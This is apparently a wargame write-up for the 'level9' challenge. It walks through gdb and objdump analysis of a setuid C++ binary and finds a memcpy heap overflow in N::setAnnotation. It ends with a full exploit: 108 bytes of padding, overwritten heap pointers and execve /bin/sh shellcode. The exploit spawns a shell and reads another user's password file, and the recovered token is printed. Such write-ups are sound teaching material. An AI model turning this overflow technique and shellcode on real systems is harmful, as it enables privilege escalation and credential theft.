```shell
$> ls -la
[...]
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
[...]

$> ./level9

$> ./level9 test

$> ./level9 test test

$> ./level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# program execute and segfault when argument is too long.
```

```shell
$> gdb -q level9
(gdb) i func
[...]
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
[...]

# a c++ style program here ...

(gdb) i var
[...]

# no interesting variables here ...

(gdb) disas main
    [...]
    0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
    0x08048602 <+14>:    jg     0x8048610 <main+28>
    0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
    0x0804860b <+23>:    call   0x80484f0 <_exit@plt>                   #1
    [...]
    0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
    0x0804861c <+40>:    mov    ebx,eax
    0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
    0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
    0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
    0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx                #2
    [...]
    0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
    0x0804863e <+74>:    mov    ebx,eax
    0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
    0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
    0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
    0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx                #3
    [...]
    0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
        [...]
    0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
        [...]
    0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>     #4

#1: if argument count is bigger than 1 jump to next step else call _exit
#2: fist call new (use gdb and add break to *b *0x08048530 to know here operator new is called) N() (same for *0x80486f6) with parameter 0x5
#3: second call new N() with parameter 0x6
#4: setAnnotation() method call in first new N() (esp+0x1c) with parameter av[1] (ebp+0xc)
```

```shell
$> objdump -d -M intel level9
[...]
    0804870e <_ZN1N13setAnnotationEPc>:
    [...]
    8048733:       e8 d8 fd ff ff          call   8048510 <memcpy@plt> 
[...]

# here is the call to memcpy()
```

After some analysis with disassemble, no shell execute is called ...
But we have here a call to memcpy() may can do some vulnerability.
We can inject a shellcode with memcpy(), because setAnnotation() method is executed with av[1] as parameter.
    
```shell
$> gdb -q level9
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
[...]
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r eax
eax            0x41366441       1094083649

# the offet is 108 bytes

(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
    0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
    0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
=>  0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
    [...]
    0x08048693 <+159>:   call   edx
    [...]

# we want overwrite esp+0x10 to inject our shellcode because it will be call later

$> gdb -q level9
(gdb) set disassembly-flavor intel
(gdb) b N::setAnnotation
(gdb) r 'test'
[...]
Breakpoint 1, 0x08048714 in N::setAnnotation(char*) ()

(gdb) i r eax
eax            0x804a008        134520840

# 0x804a008 address of a->setAnnotation

(gdb) b N::operator+
Breakpoint 2 at 0x804873d
(gdb) c
[...]
Breakpoint 2, 0x0804873d in N::operator+(N&) ()

(gdb) i r eax
eax            0x804a078        134520952

# 0x804a078 address of b->operator+

(gdb) disas 0x0804873d
    Dump of assembler code for function _ZN1NplERS_:
    0x0804873a <+0>:     push   ebp
    0x0804873b <+1>:     mov    ebp,esp
=>  0x0804873d <+3>:     mov    eax,DWORD PTR [ebp+0x8]

# to arrive the begin of the function we need 2 step (push ebp, mov ebp,esp) and we need 8 bytes (+0x8)
# 0x804a078 + 4 = 0x804a07c -> \x7c\xa0\x04\x08
# 0x804a07c + 4 = 0x804a080 -> \x80\xa0\x04\x08
# and we know to arrive the operator+ function we need 108 bytes of padding

$> python -c "print '\x90' * 108 + '\x7c\xa0\x04\x08' + '\x80\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'" > /tmp/exploit

$> ./level9 $(cat /tmp/exploit)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```